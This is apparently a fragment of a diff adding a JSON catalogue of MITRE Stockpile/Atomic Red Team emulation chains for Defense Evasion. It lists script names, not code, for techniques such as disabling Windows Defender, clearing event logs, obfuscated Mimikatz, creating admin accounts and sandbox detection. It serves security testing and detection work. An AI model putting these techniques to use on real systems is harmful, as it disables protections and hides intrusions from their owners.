+        "STOCKPILE - T1562.001 - Disable Windows Defender All [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1562.001 - Disable Windows Defender Real-Time Protection [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1562.001 - Impair Defenses: Disable or Modify Tools.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1562.001",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1562.001 - Disable Windows Defender Real-Time Protection [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - T1622 - Detect a Debugger Presence in the Machine (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Single-step MITRE Stockpile chain for T1622 - Debugger Evasion.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1622",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1622 - Detect a Debugger Presence in the Machine (Generated from Atomic Red Team) [Windows/PowerShell]"
+      ]
+    },
+    {
+      "name": "STOCKPILE - Defense Evasion - Full Tactic Convenience Chain",
+      "description": "Convenience collection of all 31 converted Defense Evasion scripts. This is not an authentic MITRE CALDERA adversary profile or validated operation sequence.",
+      "package": "stockpile-evasion-v1",
+      "tcode": "T1006",
+      "tactic": "Defense Evasion",
+      "script_refs": [
+        "STOCKPILE - T1006 - Read Volume Boot Sector Via DOS Device Path (Generated From Atomic Red Team) [Windows/PowerShell]",
+        "STOCKPILE - T1027.010 - Obfuscated PowerShell Invoke MimiKatz [Windows/PowerShell]",
+        "STOCKPILE - T1036 - Masquerading - System File Copied to Unusual Location (Generated from Atomic... [Windows/PowerShell]",
+        "STOCKPILE - T1036.003 - Move Powershell & triage [Windows/PowerShell]",
+        "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [Linux/Bash]",
+        "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [macOS/Bash]",
+        "STOCKPILE - T1070.001 - Clear Windows Event Logs [Windows/PowerShell]",
+        "STOCKPILE - T1070.003 - Avoid logs [Linux/Bash]",
+        "STOCKPILE - T1070.003 - Avoid logs [Windows/PowerShell]",
+        "STOCKPILE - T1070.003 - Avoid logs [macOS/Bash]",
+        "STOCKPILE - T1070.004 - Deadman - Delete agent file [Linux/Bash]",
+        "STOCKPILE - T1070.004 - Deadman - Delete agent file [Windows/PowerShell]",
+        "STOCKPILE - T1070.004 - Deadman - Delete agent file [macOS/Bash]",
+        "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Linux/Bash]",
+        "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Windows/CMD]",
+        "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [macOS/Bash]",
+        "STOCKPILE - T1112 - Modify Registry of Current User Profile (Generated from Atomic Red Team) [Windows/PowerShell]",
+        "STOCKPILE - T1202 - Indirect Command Execution - pcalua.exe (Generated from Atomic Red Team) [Windows/PowerShell]",
+        "STOCKPILE - T1222.001 - Enable Local and Remote Symbolic Links via fsutil (Generated from Atomic Red... [Windows/PowerShell]",
+        "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [Linux/Bash]",
+        "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [macOS/Bash]",
+        "STOCKPILE - T1484.001 - LockBit Black - Modify Group policy settings -reg (Generated from Atomic Red... [Windows/PowerShell]",
+        "STOCKPILE - T1497.001 - Check analysis environment processes [Windows/PowerShell]",
+        "STOCKPILE - T1497.001 - Virtual or Real [Windows/PowerShell]",
+        "STOCKPILE - T1497.003 - 1-min sleep [Linux/Bash]",
+        "STOCKPILE - T1497.003 - 1-min sleep [Windows/PowerShell]",
+        "STOCKPILE - T1497.003 - 1-min sleep [macOS/Bash]",
+        "STOCKPILE - T1562.001 - Bypass PowerShell ExecutionPolicy [Windows/PowerShell]",
+        "STOCKPILE - T1562.001 - Disable Windows Defender All [Windows/PowerShell]",
+        "STOCKPILE - T1562.001 - Disable Windows Defender Real-Time Protection [Windows/PowerShell]",
+        "STOCKPILE - T1622 - Detect a Debugger Presence in the Machine (Generated from Atomic Red Team) [Windows/PowerShell]"
+      ]
+    }
+  ]
+}
